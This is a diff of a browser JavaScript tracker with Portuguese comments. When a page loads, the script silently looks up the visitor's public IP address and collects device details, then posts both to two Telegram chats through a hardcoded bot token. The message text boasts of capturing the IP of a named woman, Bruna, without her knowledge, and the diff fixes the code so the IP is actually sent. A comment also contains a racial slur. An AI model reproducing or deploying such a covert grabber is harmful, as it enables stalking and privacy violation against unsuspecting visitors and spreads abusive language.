@@ -3,12 +3,10 @@
 // ================================================
 
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
-
 const CHAT_IDS = [
-    "8448614204",   // Mr. Lonely (Sou eu porra)
-    "8219025301",   // Luiz (Mono macaco queimado preto escravo)
+    "8448614204", // Mr. Lonely (Sou eu porra)
+    "8219025301", // Luiz (Mono macaco queimado preto escravo)
 ];
-
 
 // função desgraçada pra mandar msg alternativa
 async function SendCoisa(text) {
@@ -23,7 +21,6 @@ async function SendCoisa(text) {
     }
 }
 
-
 function detectDeviceType() {
     const ua = navigator.userAgent.toLowerCase();
     if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
@@ -36,21 +33,7 @@ function detectDeviceType() {
 function getDeviceInfo() {
     const deviceType = detectDeviceType();
     const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
-    const others = {
-        "navigator app_name: " : navigator.appName,
-        "navigator app_version: " : navigator.appVersion,
-        "user gpu: " : navigator.gpu,
-        "user gamepads: " : navigator.getGamepads,
-        "storage: " : navigator.storage,
-        "java enable?: " : navigator.javaEnabled(),
-        "permissons of site: " : navigator.permissions,
-        "You want a cookie?: " : navigator.cookieEnabled,
-        "credentials: " : navigator.credentials,
-        "plugins: " : navigator.plugins,
-        "product: ": navigator.product,
-        "type of connection wifi: " :  navigator.connection,
-        "connection state: " : navigator.onLine,
-    }
+
     return {
         deviceType,
         userAgent: navigator.userAgent,
@@ -61,12 +44,12 @@ function getDeviceInfo() {
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
         deviceMemory: ram,
-        outros: others
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine
     };
 }
 
 // ==================== PEGAR IPv4 FORÇADO ====================
-
 async function getIPv4({ timeoutMs = 3000 } = {}) {
     const isIPv4 = ip => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(ip);
 
@@ -78,11 +61,11 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
     };
 
     const endpoints = [
-        'https://api.ipify.org?format=json',           // retorna {ip: "..."}
-        'https://api4.my-ip.io/ip.json',               // retorna {ip: "..."}
-        'https://ipv4.icanhazip.com',                  // retorna texto puro
-        'https://api4.ipify.org?format=json',          // força ipv4 no domínio
-        'https://ipapi.co/json/'                       // ipapi.co retorna {ip: "..."} + geo
+        'https://api4.ipify.org?format=json',
+        'https://api.ipify.org?format=json',
+        'https://api4.my-ip.io/ip.json',
+        'https://ipv4.icanhazip.com',
+        'https://ipapi.co/json/'
     ];
 
     for (const url of endpoints) {
@@ -94,15 +77,15 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
             let ip;
 
             try {
-                ip = JSON.parse(text).ip; // tenta parse JSON
+                const json = JSON.parse(text);
+                ip = json.ip || json.address;
             } catch {
-                ip = text.trim(); // se não for JSON, pega texto puro
+                ip = text.trim();
             }
 
             if (isIPv4(ip)) return ip;
         } catch (e) {
             // ignora e tenta próximo fallback
-            SendCoisa(`Falha no endpoint ${url}:`, e.message);
         }
     }
 
@@ -112,10 +95,7 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
 
 // ==================== MENSAGEM QUANDO ENTRAR ====================
 async function sendMessage(ip) {
-    if (ip) processedIPs.set(ip, now);
-
     const device = getDeviceInfo();
-
     const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (agora, eu realmente enviei pra ela kaakaka)\n\n` +
                     `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                     `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
@@ -124,7 +104,8 @@ async function sendMessage(ip) {
                     `• Sistema: ${device.platform}\n` +
                     `• Tela: ${device.screen}\n` +
                     `• RAM: ${device.deviceMemory}\n` +
-                    `• Outros: ${device.others}\n\n` +
+                    `• Cookies: ${device.cookieEnabled}\n` +
+                    `• Online: ${device.onLine}\n\n` +
                     `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;
 
     for (const chatId of CHAT_IDS) {
@@ -141,12 +122,12 @@ async function sendMessage(ip) {
 // ==================== CAPTURA AO ENTRAR ====================
 async function captureIPOnLoad() {
     const ip = await getIPv4();
-    await sendMessage();
+    await sendMessage(ip);
 }
 
 // ==================== INICIALIZAÇÃO ====================
 async function init() {
-    await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
+    await captureIPOnLoad(); // Pega IPv4 + envia a mensagem no teleporra
 }
 
 init();
